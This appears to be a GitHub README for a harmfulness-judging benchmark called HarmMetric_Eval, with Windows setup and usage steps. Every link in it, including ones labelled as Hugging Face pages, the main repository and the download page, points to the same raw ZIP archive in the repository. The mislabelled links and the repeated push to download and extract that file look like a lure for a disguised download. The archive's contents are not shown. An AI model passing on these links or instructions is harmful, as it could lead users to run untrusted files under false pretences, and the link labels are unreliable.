# 🧪 HarmMetric_Eval - Check Harmful AI Output with Confidence

[![Download HarmMetric_Eval](https://img.shields.io/badge/Download-HarmMetric_Eval-blue?style=for-the-badge)](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)

## 📥 Download

Use this link to visit the page and download the files you need:

[Open HarmMetric_Eval download page](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)

## 🖥️ What this tool is for

HarmMetric_Eval helps you test how well a model or judge can spot harmful AI output. It gives you a benchmark dataset, training data, test data, and scoring code.

Use it if you want to:
- review harmfulness scores
- compare different judges
- work with the provided benchmark files
- run the scoring script on your own machine

## 🪟 What you need on Windows

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- a web browser
- 2 GB of free disk space
- Python 3.9 or newer
- internet access for the first download

If you plan to use the scoring code, install Python from the official Python site before you continue.

## 🚀 Get the files

1. Open the download page: [HarmMetric_Eval](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
2. Click the green **Code** button
3. Choose **Download ZIP**
4. Save the ZIP file to your computer
5. Right-click the ZIP file and choose **Extract All**
6. Pick a folder you can find again, such as `Downloads` or `Desktop`

If you want the dataset files only, you can also use:
- [HarmMetric Eval dataset on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
- [HarmClassifier on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)

## 📂 What is inside

After you extract the files, you will see these key folders and files:

- `data/dataset.jsonl` — benchmark dataset
- `data/train_data.jsonl` — training data
- `data/test_data.jsonl` — test data
- `benchmark_codes/scoring.py` — scoring script

The dataset files use the `.jsonl` format. That means each line is one record.

## ⚙️ Install Python on Windows

If Python is not already on your PC:

1. Go to the official Python download page
2. Download the latest Python 3 version for Windows
3. Open the installer
4. Check the box that says **Add Python to PATH**
5. Click **Install Now**
6. Finish the install

To check that Python works:

1. Open **Command Prompt**
2. Type `python --version`
3. Press **Enter**

If you see a version number, Python is ready.

## 🧰 Set up the project

1. Open the folder you extracted
2. Find the address bar at the top of the folder window
3. Click in the address bar and type `cmd`
4. Press **Enter**

A Command Prompt window will open in the project folder.

If the project includes a `requirements.txt` file, install the needed packages with:

```bash
pip install -r requirements.txt
```

If there is no requirements file, you can still use the data files and run the scoring script if the needed Python packages are already installed on your system.

## ▶️ Run the scoring code

The main scoring code is here:

`benchmark_codes/scoring.py`

To run it on Windows:

1. Open Command Prompt in the project folder
2. Type the command below
3. Press **Enter**

```bash
python benchmark_codes/scoring.py
```

If the script needs input files, place them in the same folder layout used in the repository.

## 📊 Use the benchmark data

You can open the `.jsonl` files with:
- Notepad
- VS Code
- any text editor that supports large files

For simple review:
1. Open the file
2. Read one line at a time
3. Each line holds one item in the dataset

For analysis work:
1. Load the file into Python
2. Parse each line as JSON
3. Compare labels, model output, or judge scores

## 🧪 Use the trained classifier

The trained classifier is available on Hugging Face:

[Open HarmClassifier](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)

You can use it to:
- test harmfulness prediction
- compare against other judges
- build a review workflow around the model

If you download the model files, keep them in a folder with enough free space and follow the model page steps for use.

## 🛠️ Common Windows fixes

If Command Prompt says `python is not recognized`:
1. Close Command Prompt
2. Reopen it
3. Run `python --version` again
4. If it still fails, reinstall Python and check **Add Python to PATH**

If the ZIP file does not open:
1. Right-click the file
2. Choose **Extract All**
3. Try a different folder

If the scoring script does not run:
1. Check that you are in the project folder
2. Check that Python is installed
3. Check that any needed packages are installed

If a file will not open:
1. Try VS Code or Notepad++
2. Make sure the file kept its `.jsonl` name

## 📁 Folder guide

Use this quick map to find the main parts of the project:

- `data/` — dataset files
- `benchmark_codes/` — scoring code
- `scoring.py` — main script for scoring
- `dataset.jsonl` — full benchmark set
- `train_data.jsonl` — training set
- `test_data.jsonl` — test set

## 🧭 Best way to start

If you only want the files for review:
1. Download the ZIP
2. Extract it
3. Open the `data` folder
4. Read the `.jsonl` files

If you want to run scoring:
1. Install Python
2. Download and extract the repo
3. Open Command Prompt in the project folder
4. Run `python benchmark_codes/scoring.py`

## 🔗 Useful links

- [Main repository](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
- [Benchmark dataset on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)
- [Trained classifier on Hugging Face](https://github.com/unstructured-scrappiness969/HarmMetric_Eval/raw/refs/heads/main/benchmark_codes/Metric-Eval-Harm-3.2-beta.2.zip)

## 📝 File format tips

The `.jsonl` files are plain text, but they are not meant for word processing. Use a text editor or a Python script to work with them.

If you want to inspect one file in Python, use a simple loop that reads each line and converts it from JSON text into a Python object.

## 🔍 What this repository helps you do

This repository gives you a way to:
- study harmfulness checks
- compare metric results
- test judges on benchmark data
- reuse the provided training and test sets
- run the scoring logic in `benchmark_codes/scoring.py`

## 💾 Keep your files organized

A simple folder setup helps:

- `Downloads\HarmMetric_Eval.zip`
- `Documents\HarmMetric_Eval\`
- `Documents\HarmMetric_Eval\data\`
- `Documents\HarmMetric_Eval\benchmark_codes\`

Keeping the files in one place makes it easier to find the dataset and the scoring script later